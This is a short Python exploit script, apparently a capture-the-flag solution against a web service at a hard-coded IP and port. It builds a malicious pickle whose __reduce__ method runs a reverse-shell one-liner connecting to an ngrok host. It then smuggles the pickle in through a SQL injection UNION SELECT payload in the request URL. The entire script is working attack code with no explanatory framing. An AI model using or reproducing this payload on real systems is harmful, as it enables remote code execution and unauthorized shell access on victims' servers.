import pickle
import base64
import os
import requests

url = "http://34.124.192.13:54679/view/1"

class RCE(object):
    def __reduce__(self):
        return (os.system,('''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.ap.ngrok.io",13674));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")' ''',))

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    payload = f"' AND 0 UNION ALL SELECT '{base64.urlsafe_b64encode(pickled).decode()}'-- -"
    r = requests.get(url + payload)